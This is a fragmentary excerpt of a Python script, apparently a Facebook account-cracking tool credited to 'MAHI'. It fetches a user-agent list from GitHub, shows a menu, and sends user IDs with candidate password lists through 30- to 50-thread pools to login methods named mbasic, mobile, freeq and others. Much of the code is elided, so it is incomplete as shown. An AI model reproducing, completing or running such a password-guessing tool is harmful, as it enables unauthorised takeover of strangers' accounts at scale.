#created by MAHI aka Aryan chaudhary
#open source by MAHI
#github= MAHI-XD
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/MAHI-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
[+] FB GROUP     :  HELPING GROUP
[+] ON GITHUB    :  MAHI-SHENI-143
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.2
[+]=============================================="""
...
def MAHI1():
	...
	print("[+]==============================================")
	MAHIlovesyou = input("[+] [CHOOSE] :- ")
	if MAHIlovesyou in ['y','Y','1','yes','YES','Yes']:
		MAHI_xd.append('y')
	else:
		MAHI_xd.append('n')
	print("[+]==============================================")
	...
	print("[+]==============================================")
	MAHItop = input("[+] [CHOOSE] :- ")
	if MAHItop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{MAHIfire}')
		...
		for guru in user:
			...
			if MAHIfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif MAHIfire =='2':yaari.submit(p,uid,pwx,tl)
			elif MAHIfire =='3':yaari.submit(x,uid,pwx,tl)
			elif MAHIfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif MAHIfire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif MAHIfire =='6':yaari.submit(d,uid,pwx,tl)
			else:
...
def MAHI5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if MAHIfire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif MAHIfire =='2':manshera.submit(p,uid,pwx,tl)
			elif MAHIfire =='3':manshera.submit(x,uid,pwx,tl)
			elif MAHIfire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif MAHIfire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif MAHIfire =='6':manshera.submit(d,uid,pwx,tl)
			else:
